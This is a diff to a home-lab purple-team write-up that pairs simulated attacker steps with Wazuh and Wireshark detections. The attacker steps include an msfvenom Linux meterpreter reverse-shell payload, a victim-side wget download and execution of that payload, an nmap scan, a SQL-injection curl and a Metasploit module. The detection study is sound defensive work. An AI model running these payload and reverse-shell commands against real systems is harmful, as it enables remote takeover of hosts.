@@ -1,4 +1,4 @@
-#  PurpleOps-Playground — Blue Team Play-by-Play
+#  PurpleOps-Playground — Blue Team Play-by-Play(Red Team Simulated Attack by me)
 
 **Author:** Bobo Nikolov  
 **Project:** PurpleOps-Playground  
@@ -93,16 +93,108 @@ Below I walk through each phase, show what I (the defender) observed in Wazuh / 
 
 **Attacker activity**
 ```bash
-
-nmap -sS -sV 10.10.10.20
+nmap -sV 10.10.10.20 (Deliberately didn't use -sS option so I will be able to fully see the TCP handshake)
 ```
 
 **Defender findings**
 
-Nmap Wazuh Alerts:
+Wazuh Artifacts:
 
 ![Enumeration](Projects/PurpleOps-playground/Screenshots/Screenshots/Recon/Wazuh/2025-11-06_22-28-54_Recon(nmap)_Enumeration.png)
 
 ![Enumeration](Projects/PurpleOps-playground/Screenshots/Screenshots/Recon/Wazuh/2025-11-06_22-29-00_Nmap-Recon_Enumeration_Wazuh.png)
 
-Wazuh: Rule 
+![Enumeration](Projects/PurpleOps-playground/Screenshots/Screenshots/Recon/Wazuh/2025-11-06_22-28-54_Nmap_Wazuh.png)
+
+Wazuh: Rule 31101 triggered (Web Server 400 Error) triggered by nmap scripting. 
+
+---
+
+Wireshark Artifacts:
+
+![Enumeration](Projects/PurpleOps-playground/Screenshots/Screenshots/Recon/Wireshark/2025-11-06_22-29-00_Nmap-Recon_Wireshark.png)
+
+Wireshark: TCP SYN flood from 10.10.10.10 to 10.10.10.20.
+
+---
+
+### Initial Access(T1190/T1204) 
+
+**Attacker Activity**
+```bash
+# Attacker
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell32.elf
+python3 -m http.server 8000 --bind 10.10.10.10
+
+# Victim
+wget http://10.10.10.10:8000/shell32.elf -O /tmp/shell && chmod +x /tmp/shell
+```
+
+**Defender Findings**
+
+Wireshark Artifacts:
+
+![Initial Access](Projects/PurpleOps-playground/Screenshots/Screenshots/Initial-Access/Wireshark/2025-11-06_22-40-55_Initial-Access_Unknown-File-Downloaded.png)
+
+Wiresark: HTTP GET /shell32.elf, binary ELF transfer detected.
+
+Defender Note: Wazuh didn't capture the wget or file downloaded.
+
+---
+
+### Execution(T1059/T1110/T1190)
+
+**Attacker Activity**
+
+Attempted SQL Injections(Harmless)
+
+```bash
+curl -XGET "http://10.10.10.20/users/?id=SELECT+*+FROM+users";
+```
+
+Attempted Brute Force Attack using Metasploit
+
+```bash
+use linux/http/netgear_wnr2000_rce 
+```
+
+Payload Execution(Victim)
+```bash
+./shell
+```
+
+**Defender Findings**
+
+Wazuh SQLI Artifacts:
+
+![Execution](Projects/PurpleOps-playground/Screenshots/Screenshots/Execution/Wazuh/2025-11-06_22-31-25_Attempted-SQLInjection-Wazuh.png)
+
+Wazuh: Web log anomaly (possible injection attempt)
+
+Wireshark SQLI Artifacts:
+
+![Execution](Projects/PurpleOps-playground/Screenshots/Screenshots/Execution/Wireshark/2025-11-06_22-39-25_Attempted-SQLInjection-Wireshark.png)
+
+Wireshark: Unusual HTTP payload patterns in POST request.
+
+Wazuh Brute Force Artifacts:
+
+![Execution](Projects/PurpleOps-playground/Screenshots/Screenshots/Execution/Wazuh/2025-11-06_22-40-13_Attempted-Brute-Force-Attack_Wazuh_Overview.png)
+
+Wazuh: Multiple failed authentication alerts.
+
+Wireshark Brute Force Artifacts:
+
+![Execution](Projects/PurpleOps-playground/Screenshots/Screenshots/Execution/Wireshark/2025-11-06_22-40-13_Attempted-Brute-Force-Attack_Wireshark_Overview.png)
+
+Wireshark: Identical POST login attempts observed.
+
+Wazuh Payload Execution: No explicit alert(missed correlation).
+
+Wireshark Payload Execution Artifacts:
+
+
+
+
+
+
